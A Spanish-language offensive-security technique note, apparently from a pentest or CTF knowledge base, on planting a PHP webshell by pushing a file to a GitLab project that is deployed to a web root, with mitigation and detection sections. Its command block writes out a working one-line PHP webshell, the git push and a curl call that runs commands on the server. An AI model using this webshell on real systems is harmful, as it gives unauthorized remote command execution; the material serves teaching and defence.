---
topic: GitLab — webshell en un proyecto desplegado
tags: [web, gitlab, webshell, deployment, git]
---

# GitLab — webshell en un proyecto desplegado

[🌐 English](gitlab-webshell.en.md) | **Español**

## Concepto

GitLab no ejecuta PHP por sí solo, pero un proyecto puede estar clonado en el document root de una web. Si un usuario autenticado puede crear o modificar archivos y el despliegue los publica, un `.php` confirmado se convierte en webshell. La vulnerabilidad es la confianza entre el repositorio y el servidor web.

## Cuándo aplica

- GitLab permite registro o se han obtenido credenciales válidas.
- El servidor tiene proyectos clonados en `/var/www` o los despliega automáticamente.
- El stack del sitio interpreta PHP, Python o CGI desde esa ruta.

## Procedimiento

1. Enumerar proyectos, ramas y pipelines visibles para la cuenta.
2. Clonar el proyecto y comprobar si su ruta corresponde al document root.
3. Añadir un archivo interpretable, confirmar y hacer push.
4. Solicitar el archivo por HTTP y ejecutar comandos.

## Comandos

```bash
git clone http://<USER>:<PASS>@<HOST>/root/profile.git
cd profile
printf "%s\n" "<?php system($_GET["cmd"]); ?>" > shell.php
git add shell.php && git commit -m shell && git push
curl "http://<HOST>/profile/shell.php?cmd=id"
```

## Variantes

- Modificar una plantilla existente para que la webshell quede en una ruta ya publicada.
- Usar un pipeline de CI que despliegue la rama a producción.
- Aprovechar un proyecto público y un runner mal aislado.

## Limitaciones

- GitLab almacena el código, pero no lo ejecuta: hace falta un despliegue o un runner.
- El servidor web puede servir solo ramas concretas.
- Los permisos de la cuenta pueden impedir push a la rama desplegada.

## Mitigación

- Separar GitLab del servidor que publica el código.
- Aplicar revisión, firmas y permisos mínimos a las ramas desplegadas.
- Servir solo artefactos compilados y bloquear extensiones ejecutables.

## Detección

- Commits que añaden `.php`, `.jsp` o `.aspx` a un proyecto desplegado.
- Peticiones HTTP a archivos recién creados en el document root.
- Pipelines que publican cambios sin revisión.

## Referencias

- [0xdf — Bitlab](https://0xdf.gitlab.io/2020/01/11/htb-bitlab.html)
- [GitLab Docs — Projects](https://docs.gitlab.com/ee/user/project/)
- [CWE-434 — Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
